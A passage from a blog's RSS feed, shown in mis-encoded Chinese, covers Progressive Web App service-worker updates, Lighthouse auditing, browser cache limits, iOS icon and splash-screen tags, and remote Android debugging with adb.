    &lt;p&gt;ç”¨æˆ·æ‰“å¼€ PWAåº”ç”¨ï¼ˆå¯ä»¥ä½¿chromeä¸­ï¼Œä¹Ÿå¯ä»¥æ˜¯æ¡Œé¢ï¼‰ï¼Œæµè§ˆå™¨ä¼šå°è¯•ä»åå°é‡æ–°ä¸‹è½½å®šä¹‰æœåŠ¡å·¥ä½œçº¿ç¨‹çš„è„šæœ¬æ–‡ä»¶ã€‚&lt;strong&gt;&lt;u&gt;è‹¥ä¸‹è½½çš„æœåŠ¡å·¥ä½œçº¿ç¨‹æ–‡ä»¶ä¸å½“å‰çš„æœåŠ¡å™¨å·¥ä½œçº¿ç¨‹æ–‡ä»¶å­˜åœ¨å­—èŠ‚çš„å·®å¼‚ï¼Œåˆ™è§†ä¸ºæ–°çš„æœåŠ¡å·¥ä½œçº¿ç¨‹&lt;/u&gt;&lt;/strong&gt;ã€‚è¿™æ„å‘³ç€æƒ³è¦ç«™ç‚¹åœ¨ç”¨æˆ·è®¾å¤‡ä¸Šæ¿€æ´»æ›´æ–°äº‹ä»¶ï¼Œæ¯æ¬¡å‘å¸ƒéƒ½éœ€è¦ä¿®æ”¹ &lt;strong&gt;service-worker.js&lt;/strong&gt; æ–‡ä»¶ï¼Œåœ¨æœåŠ¡å·¥ä½œçº¿ç¨‹æ–‡ä»¶ä¸­ä¿®æ”¹ç‰ˆæœ¬å·ã€å›è½¦ã€åŠ ä¸ªç©ºæ ¼éƒ½è§†ä¸ºå­—èŠ‚çš„å˜åŒ–ã€‚&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;æ–°æœåŠ¡å·¥ä½œçº¿ç¨‹ä¼šå¯åŠ¨ï¼Œä¸”è§¦å‘ &lt;strong&gt;install&lt;/strong&gt; äº‹ä»¶&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;æ­¤æ—¶ï¼Œæ—§æœåŠ¡å·¥ä½œçº¿ç¨‹ä»æ§åˆ¶ç€å½“å‰é¡µé¢ï¼Œæ–°æœåŠ¡å·¥ä½œçº¿ç¨‹è¿›å…¥ &lt;strong&gt;waiting&lt;/strong&gt; çŠ¶æ€ã€‚&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190321/sw11.png&quot; alt=&quot;sw11&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;å½“å…³æ‰é‡æ–°æ‰“å¼€ PWAåº”ç”¨ æ—¶ï¼Œå°±å·¥ä½œçº¿ç¨‹è¢«ç»ˆæ­¢ï¼Œæ–°æœåŠ¡çº¿ç¨‹å–å¾—æ§åˆ¶æƒï¼ŒåŒæ—¶è§¦å‘ &lt;strong&gt;activate&lt;/strong&gt; äº‹ä»¶ï¼Œåˆ é™¤æ—§çš„ç¼“å­˜&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190321/sw12.png&quot; alt=&quot;sw12&quot; /&gt;&lt;strong&gt;æ€»ç»“æ¿€æ´»æ›´æ–°&lt;/strong&gt;&lt;/p&gt;

    &lt;p&gt;æ›´æ–° html å†…å®¹ï¼Œä¿®æ”¹ &lt;strong&gt;Service Worker&lt;/strong&gt;ï¼Œæ‰“å¼€ PWAåº”ç”¨ï¼Œç”±äºæœåŠ¡å·¥ä½œçº¿ç¨‹å·²ç»æ”¹å˜ï¼Œè§¦å‘ &lt;strong&gt;install&lt;/strong&gt; äº‹ä»¶ï¼Œæ–°çš„ç¼“å­˜è¢«å®‰è£…ï¼Œå…³é—­ PWAåº”ç”¨ å†é‡æ–°æ‰“å¼€ï¼Œæ¥æ‰‹ï¼Œè§¦å‘ &lt;strong&gt;activate&lt;/strong&gt; äº‹ä»¶åˆ é™¤è€ç¼“å­˜ï¼Œé¡µé¢åˆ·æ–°ä¸ºæ–°çš„htmlå†…å®¹ã€‚&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;5-å¯¹-pwa-åº”ç”¨è¿›è¡Œå®¡è®¡&quot;&gt;5. å¯¹ PWA åº”ç”¨è¿›è¡Œå®¡è®¡&lt;/h2&gt;

&lt;p&gt;ä½¿ç”¨ &lt;a href=&quot;//github.com/GoogleChrome/lighthouse&quot;&gt;Lighthouse&lt;/a&gt; å·¥å…·å¯ä»¥å¯¹ PWA åº”ç”¨è¿›è¡Œå®¡è®¡ï¼Œä»¥æ£€æŸ¥å½“å‰çš„ PWA æ˜¯å¦æ­£å¸¸ã€‚æ­¤æ’ä»¶å¯ä»¥åœ¨ Chrome æµè§ˆå™¨è¿›è¡Œå®‰è£…ï¼Œå®‰è£…å®Œæˆåï¼Œåœ¨æµè§ˆå™¨ä¸­è¾“å…¥ PWA åº”ç”¨çš„åœ°å€ï¼Œç‚¹å‡» Lighthouse æ’ä»¶è¿›è¡Œå®¡è®¡å·¥ä½œã€‚&lt;/p&gt;

&lt;p&gt;è¿™é‡Œæˆ‘ä½¿ç”¨æˆ‘çš„åšå®¢ç«™ç‚¹è¿›è¡Œæµ‹è¯•ï¼Œæœ€åç”Ÿæˆçš„æŠ¥å‘Šå¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190321/lighthouse.png&quot; alt=&quot;lighthouse&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ä»ä¸Šè¿°çš„æŠ¥å‘Šä¸­å¯ä»¥çœ‹åˆ°ï¼Œå½“å‰ https://wangjun.dev çš„ç«™ç‚¹å¯¹äº PWA åº”ç”¨æ”¯æŒçš„å¾—åˆ†ä¸º 91ï¼Œé™¤äº†æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯æ— æ³•ä» HTTP è¯·æ±‚è½¬å‘åˆ° HTTPS è¯·æ±‚ã€‚&lt;/p&gt;

&lt;h2 id=&quot;é™„å½•a-ä¸åŒæµè§ˆå™¨å¯¹-pwa-åº”ç”¨ç¼“å­˜çš„é™åˆ¶&quot;&gt;é™„å½•A ä¸åŒæµè§ˆå™¨å¯¹ PWA åº”ç”¨ç¼“å­˜çš„é™åˆ¶&lt;/h2&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;æµè§ˆå™¨&lt;/th&gt;
      &lt;th&gt;é™åˆ¶&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;Chrome&lt;/td&gt;
      &lt;td&gt;å¯ç”¨ç©ºé—´ &amp;lt; 6%&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;FireFox&lt;/td&gt;
      &lt;td&gt;å¯ç”¨ç©ºé—´ &amp;lt; 10%&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Safari&lt;/td&gt;
      &lt;td&gt;å¯ç”¨ç©ºé—´ &amp;lt; 50MB&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;IE10&lt;/td&gt;
      &lt;td&gt;å¯ç”¨ç©ºé—´ &amp;lt; 250MB&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;é™„å½•b-pwaåœ¨iosä¸­çš„é—®é¢˜ä¸è§£å†³æ–¹æ³•&quot;&gt;é™„å½•B PWAåœ¨IOSä¸­çš„é—®é¢˜ä¸è§£å†³æ–¹æ³•&lt;/h2&gt;

&lt;p&gt;IOSåœ¨11.3å¼€å§‹æ”¯æŒPWAåº”ç”¨ï¼Œä½†å…¼å®¹æ€§ä»ç„¶ä¸èƒ½è¾¾åˆ°ç†æƒ³ï¼Œç°é˜¶æ®µæ™ºèƒ½è°ƒç”¨æœ‰é™çš„ APIï¼Œå…·ä½“ä¸»è¦è¡¨ç°ä¸ºä»¥ä¸‹å‡ ä¸ªé—®é¢˜ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;æ— æ³•åå°åŒæ­¥ï¼Œä¹Ÿå°±æ— æ³•è¿›è¡Œæ¶ˆæ¯æ¨é€&lt;/li&gt;
  &lt;li&gt;ä¸æ”¯æŒå…¨å±æ˜¾ç¤º&lt;/li&gt;
  &lt;li&gt;æ— æ³•é”å®šPWAåº”ç”¨æ–¹å‘ï¼Œç«–å±è¿˜æ˜¯æ¨ªå±&lt;/li&gt;
  &lt;li&gt;æ— æ³•æ”¹å˜çŠ¶æ€æ é¢œè‰²&lt;/li&gt;
  &lt;li&gt;æ²¡æœ‰å¯åŠ¨åŠ¨ç”»&lt;/li&gt;
  &lt;li&gt;ä¸æ”¯æŒé€æ˜å›¾æ ‡&lt;/li&gt;
  &lt;li&gt;â€¦â€¦&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;å½“ç„¶æŸäº›é—®é¢˜æ˜¯å¯ä»¥è§£å†³çš„ï¼Œå¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;æ¡Œé¢å›¾æ ‡&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;IOS çš„ Safari æµè§ˆå™¨æš‚æ—¶ä¸æ”¯æŒè¯»å– manifest.json æ–‡ä»¶çš„ icon é…ç½®ä¿¡æ¯ï¼Œå½“æ·»åŠ åˆ°æ¡Œé¢æ—¶ï¼Œåªæ˜¯é¡µé¢çš„ç¼©ç•¥å›¾ï¼Œå¯¹ç”¨æˆ·ä¸æ˜¯å¾ˆå‹å¥½ï¼Œå…·ä½“çš„æ”¹å–„æ­¥éª¤ä¸ºï¼Œåœ¨ index.html ä¸­çš„ head æ ‡ç­¾å†…æ·»åŠ é€‚é…ä¿¡æ¯&lt;/p&gt;

&lt;p style=&quot;text-align:center;&quot;&gt;&lt;img src=&quot;https://www.netguru.co/hs-fs/hubfs/white_splash_small.gif?t=1526027228428&amp;amp;width=300&amp;amp;height=537&amp;amp;name=white_splash_small.gif&quot; style=&quot;height:300px;margin:0 auto;&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;apple-touch-icon&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/assets/icons/icon-96x96.png&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;apple-touch-icon&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;sizes=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;152x152&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/assets/icons/icon-152x152.png&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;apple-touch-icon&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;sizes=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;180x180&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/assets/icons/icon-180x180.png&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;apple-touch-icon&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;sizes=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;167x167&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/assets/icons/icon-167x167.png&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;å¯åŠ¨é¡µé¢&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;IOS åœ¨å¯åŠ¨ PWAåº”ç”¨æ—¶ï¼Œå¯åŠ¨é¡µé¢é»˜è®¤æ˜¯é»‘å±æˆ–è€…ç™½å±ï¼Œå¯¹äºè¿™ä¸ªé—®é¢˜å¯ä»¥åœ¨ &lt;a href=&quot;https://developer.apple.com/library/content/documentation/AppleApplications/Reference/SafariWebContent/ConfiguringWebApplications/ConfiguringWebApplications.html&quot;&gt;apple developerâ€™s page&lt;/a&gt; æ‰¾åˆ°è§£å†³æ–¹æ¡ˆï¼Œé€šè¿‡åŠ å…¥ &lt;strong&gt;apple-touch-startup-image&lt;/strong&gt; æ ‡ç­¾è§£å†³ï¼Œå¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;apple-mobile-web-app-capable&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;yes&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;apple-mobile-web-app-capable&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;yes&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;apple-mobile-web-app-status-bar-style&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;black&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/apple_splash_2048.png&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;sizes=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2048x2732&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;apple-touch-startup-image&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/apple_splash_1668.png&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;sizes=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1668x2224&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;apple-touch-startup-image&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/apple_splash_1536.png&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;sizes=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1536x2048&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;apple-touch-startup-image&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/apple_splash_1125.png&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;sizes=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1125x2436&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;apple-touch-startup-image&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/apple_splash_1242.png&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;sizes=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1242x2208&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;apple-touch-startup-image&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/apple_splash_750.png&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;sizes=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;750x1334&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;apple-touch-startup-image&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/apple_splash_640.png&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;sizes=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;640x1136&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;apple-touch-startup-image&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;ä¸æ”¯æŒå¼¹å‡ºâ€Add to home screenâ€çš„æ¨ªå¹…&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;åœ¨ Android ç³»ç»Ÿä¸­ï¼Œä¼šå¼¹å‡ºæ¨ªå¹…é¼“åŠ±ç”¨æˆ·å°† PWAåº”ç”¨ æ·»åŠ åˆ°ä¸»å±å¹•ä¸­ã€‚ä½†æ˜¯åœ¨ IOS ç³»ç»Ÿä¸­ä¸ä¼šæœ‰æ¬¡æ¨ªå¹…å¼¹å‡ºï¼Œæƒ³è¦æ·»åŠ åˆ°ä¸»å±ï¼Œéœ€è¦ä¸‰ä¸ªæ­¥éª¤ã€‚&lt;/p&gt;

&lt;p&gt;å¯¹äºè¿™ç§æ–¹å¼å¢åŠ åˆ°ä¸»å±è‚¯å®šæ˜¯ä¸å‹å¥½çš„ï¼Œå»ºè®®è®¾è®¡ä¸€ä¸ªå¼¹å‡ºå±‚ï¼Œä»¥å‹å¥½çš„æ–¹å¼æç¤ºç”¨æˆ·å°† PWA åº”ç”¨æ·»åŠ åˆ°ä¸»å±ä¸­ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¼¹å‡ºå±‚éœ€è¦æ£€æŸ¥å½“å‰ PWA åº”ç”¨æ˜¯å¦æ˜¯ &lt;strong&gt;window.navigator.standalone&lt;/strong&gt; çš„æƒ…å†µã€‚&lt;/p&gt;

&lt;p style=&quot;text-align:center;&quot;&gt;

&lt;img src=&quot;https://www.netguru.co/hs-fs/hubfs/add_to_homescreen_small.gif?t=1526027228428&amp;amp;width=300&amp;amp;name=add_to_homescreen_small.gif&quot; style=&quot;height:300px;&quot; /&gt;

&lt;img src=&quot;https://www.netguru.co/hs-fs/hubfs/Simulator%20Screen%20Shot%20-%20iPhone%206s%20-%202018-04-04%20at%2010.14.00.png?t=1526027228428&amp;amp;width=300&amp;amp;height=534&amp;amp;name=Simulator%20Screen%20Shot%20-%20iPhone%206s%20-%202018-04-04%20at%2010.14.00.png&quot; style=&quot;height:300px;&quot; /&gt;

&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;å…³äºå¯¼èˆªçš„é—®é¢˜&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;å½“åœ¨ IOS ä¸‹è¿è¡Œ PWA åº”ç”¨æ—¶ï¼Œè‹¥å¤„äº &lt;strong&gt;standalone&lt;/strong&gt; æ¨¡å¼æ—¶ï¼Œç”±äºè‹¹æœæ‰‹æœºæ²¡æœ‰è¿”å›çš„æŒ‰é”®ï¼Œå› æ­¤åœ¨è®¾è®¡åº”ç”¨ç•Œé¢æ—¶éœ€è¦ç¡®ä¿ç”¨æˆ·æœ‰è¿”å›æ§åˆ¶é”®ä»¥åŠå¯ä»¥ä»ä»»ä½•ä½ç½®è¿”å›åˆ°ä¸»é¡µä¸Šã€‚&lt;/p&gt;

&lt;p&gt;è¿™ä½ å¯ä»¥é€šè¿‡æ˜¾ç¤ºåé€€æŒ‰é’®æˆ–è€…åœ¨IOSå°šæ·»åŠ æ›´å¤šçš„èœå•æ æ¥å®ç°ã€‚&lt;/p&gt;

&lt;h2 id=&quot;é™„å½•c-å®éªŒä¸­çš„pwaåº”ç”¨å‚è€ƒ&quot;&gt;é™„å½•C å®éªŒä¸­çš„PWAåº”ç”¨å‚è€ƒ&lt;/h2&gt;

&lt;p&gt;å…³äº PWAåº”ç”¨ çš„å®Œå–„ç‰ˆï¼Œå¯ä»¥å‚è€ƒæœ¬ç«™ç‚¹ &lt;a href=&quot;https://vinny.cc&quot;&gt;vinny.cc&lt;/a&gt; çš„å®ç°ï¼Œå…³é”®çš„æ–‡ä»¶å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://vinny.cc/manifest.json&quot;&gt;https://vinny.cc/manifest.json&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://vinny.cc/assets/main.js&quot;&gt;https://vinny.cc/assets/main.js&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://vinny.cc/service-worker.js&quot;&gt;https://vinny.cc/service-worker.js&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;é™„å½•d-å¦‚ä½•å¯¹pwaè¿›è¡Œè¿œç¨‹è°ƒè¯•&quot;&gt;é™„å½•D å¦‚ä½•å¯¹PWAè¿›è¡Œè¿œç¨‹è°ƒè¯•&lt;/h2&gt;

&lt;p&gt;è¿™é‡Œçš„ç¯å¢ƒæ˜¯ä½¿ç”¨Androidç³»ç»Ÿçš„çœŸæœºè¿›è¡Œ PWA åº”ç”¨çš„è°ƒè¯•&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;æ‰‹æœºçš„è®¾ç½®ä¸­æ‰“å¼€ &lt;strong&gt;USBè°ƒè¯•æ¨¡å¼&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;ä½¿ç”¨USBçº¿æ¥å…¥ç”µè„‘æˆ–è€…åœ¨æ‰‹æœºä¸Šå®‰è£… ADB è¿œç¨‹è°ƒè¯•å·¥å…·ï¼Œå¦‚ ç½‘ç»œadb&lt;/p&gt;

    &lt;p style=&quot;text-align:center;&quot;&gt;&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190321/14822209063612928.png&quot; style=&quot;height:300px;&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;è‹¥ä½¿ç”¨ è¿œç¨‹adb çš„æ–¹å¼ï¼Œåˆ™å¦‚è¦ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å»ºç«‹è¿æ¥ï¼š&lt;/p&gt;

    &lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;adb connect 192.168.1.198:5555
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;adb devices
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;åœ¨ç”µè„‘ä¸Šæ‰“å¼€ Chrome æµè§ˆå™¨å¹¶æ‰“å¼€å¼€å‘è€…å·¥å…·ï¼Œæ‰“å¼€ Remote devices åº”å¯ä»¥çœ‹è§å·²è¿æ¥ä¸Šçš„Androidè®¾å¤‡&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190321/pwa_debug-1.png&quot; alt=&quot;pwd-debug-1&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;åœ¨æ‰‹æœºä¸­æ‰“å¼€ PWAåº”ç”¨ï¼Œåœ¨æµè§ˆå™¨å¼€å‘è€…å·¥å…·ä¸­å°±å¯ä»¥çœ‹è§å¹¶è¿›è¡Œè°ƒè¯•&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190321/pwa_debug-2.png&quot; alt=&quot;pwd-debug-2&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;å¦å¤–å¦‚æœ &lt;strong&gt;PWAåº”ç”¨&lt;/strong&gt; éƒ¨ç½²åœ¨æœ¬åœ°ï¼Œå¯ä»¥é€šè¿‡chromeæµè§ˆå™¨çš„ &lt;code class=&quot;highlighter-rouge&quot;&gt;Port forwarding&lt;/code&gt; åŠŸèƒ½å°†æœ¬åœ° &lt;strong&gt;PWAåº”ç”¨&lt;/strong&gt; æ˜ å°„åˆ°æ‰‹æœºä¸Šï¼Œè¿™æ ·åœ¨æ‰‹æœºä¸­è¾“å…¥â€localhost:8887â€å³å¯åœ¨è°ƒè¯•ä¸­å‡ºç°ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190321/pwa_debug-3.png&quot; alt=&quot;pwa_debug-3&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;å‚è€ƒæ–‡ç« &quot;&gt;å‚è€ƒæ–‡ç« &lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://www.netguru.co/codestories/few-tips-that-will-make-your-pwa-on-ios-feel-like-native&quot;&gt;https://www.netguru.co/codestories/few-tips-that-will-make-your-pwa-on-ios-feel-like-native&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://developers.google.com/web/fundamentals/app-install-banners/&quot;&gt;https://developers.google.com/web/fundamentals/app-install-banners/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://developers.google.com/web/fundamentals/primers/service-workers/&quot;&gt;https://developers.google.com/web/fundamentals/primers/service-workers/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://developers.google.com/web/tools/lighthouse/?hl=zh-cn&quot;&gt;https://developers.google.com/web/tools/lighthouse/?hl=zh-cn&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>  
               <pubDate>Fri, 11 May 2018 00:00:00 +0800</pubDate>  
               <link>http://localhost:4000/2018/05/pwa-app/</link>  
               <guid isPermaLink="true">http://localhost:4000/2018/05/pwa-app/</guid>  
               </item>  
          
            <item>  
               <title>ä»é›¶å¼€å§‹åˆ›å»ºå¹¶å‘å¸ƒNPM Cliçš„åº”ç”¨</title>  
               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#1-èƒŒæ™¯&quot; id=&quot;markdown-toc-1-èƒŒæ™¯&quot;&gt;1. èƒŒæ™¯&lt;/a&gt;&lt;/li&gt;
